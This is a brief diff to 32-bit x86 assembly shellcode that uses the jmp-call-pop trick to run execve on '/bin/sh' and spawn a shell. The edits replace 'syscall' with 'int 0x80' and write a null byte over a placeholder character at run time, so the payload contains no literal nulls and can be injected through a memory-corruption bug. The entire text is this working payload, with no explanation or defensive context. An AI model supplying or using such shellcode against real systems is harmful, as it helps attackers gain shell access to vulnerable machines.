@@ -8,12 +8,13 @@ _start:
 code:
   pop ebx			
   xor eax, eax
+  mov [ebx + 7], al
   mov edx,eax
   push eax		
   push ebx	
   mov ecx,esp
   mov al, 0x0b
-  syscall
+  int 0x80
 end:
   call code
-  db "bin/sh"
+  db "/bin/shJ"
